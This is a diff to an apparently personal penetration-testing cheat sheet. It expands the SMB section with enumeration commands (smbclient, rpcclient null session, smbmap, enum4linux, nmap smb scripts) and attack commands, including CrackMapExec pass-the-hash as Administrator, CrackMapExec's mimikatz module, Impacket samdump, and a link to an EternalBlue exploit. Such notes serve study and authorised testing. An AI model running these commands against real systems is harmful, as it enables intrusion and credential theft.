@@ -95,16 +95,47 @@ Can I ...
 ### Port 139, 445: SMB 
 	
 Can I...
-Enum with smbmap, enum4linux, check for anon log in
+Enum with smbmap, enum4linux, nmap, crackmapexec, check for anon log in
 	[Eternal Blue](https://github.com/3ndG4me/AutoBlue-MS17-010) 
 	[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)  
+
+Access with smbclient or rpcclient
 	
-    smbclient -L <IP>
-    rpcclient -U "" <IP>
-    smbclient -U <HOST> -L <IP>
-    /usr/bin/smbclient \\\\<IP>\\share <HOST>  
-    smbmap -H 127.0.0.1 -u username -p password   	
+    smbclient -L 10.10.10.10  
+    smbclient -U <HOST> -L 10.10.10.10
+    smbclient \\\\10.10.10.10\\share  
+    rpcclient -U "" -N 10.10.10.10 enumdomusers
 	
+smbmap: 
+	
+    smbmap -H 127.0.0.1 -d domain -u username -p password   	
+
+enum4linux: 
+	
+    enum4linux -a 172.21.0.0
+	
+nmap: 
+	
+    nmap --script smb-* -p 139,445, 172.21.0.0
+    nmap --script smb-enum-* -p 139,445, 172.21.0.0
+
+
+CrackMapExec: 
+
+    crackmapexec smb -L 
+    crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
+    crackmapexec 172.21.0.0 -u Administrator -H [hash] --share
+    crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
+
+Impacket SmbClient: 
+
+     /usr/share/doc/python3-impacket/examples/smbclient.py username@172.21.0.0
+	
+Impacket: 
+
+     python3 samdump.py SMB 172.21.0.0
+
+
 ### Port 2049: NFS 
 	
 	[Pentesting NFS](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)  
